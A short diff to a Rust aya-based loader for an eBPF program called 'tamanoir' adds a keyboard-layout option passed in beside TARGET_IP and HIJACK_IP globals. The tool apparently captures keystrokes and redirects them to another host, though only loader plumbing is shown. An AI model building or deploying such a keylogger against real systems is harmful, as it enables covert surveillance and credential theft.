@@ -5,7 +5,7 @@ use aya::{
     EbpfLoader,
 };
 use clap::Parser;
-use log::{debug, info, warn};
+use log::{debug, warn};
 use tokio::signal;
 
 #[derive(Debug, Parser)]
@@ -18,6 +18,9 @@ struct Opt {
 
     #[clap(long, required = true)]
     hijack_ip: String,
+
+    #[clap(long, default_value = "0")]
+    layout: u8,
 }
 
 #[tokio::main]
@@ -28,6 +31,7 @@ async fn main() -> anyhow::Result<()> {
         iface,
         target_ip,
         hijack_ip,
+        layout,
     } = Opt::parse();
 
     let rlim = libc::rlimit {
@@ -45,6 +49,7 @@ async fn main() -> anyhow::Result<()> {
     let mut ebpf = EbpfLoader::new()
         .set_global("TARGET_IP", &target_ip, true)
         .set_global("HIJACK_IP", &hijack_ip, true)
+        .set_global("KEYBOARD_LAYOUT", &layout, true)
         .load(aya::include_bytes_aligned!(concat!(
             env!("OUT_DIR"),
             "/tamanoir"
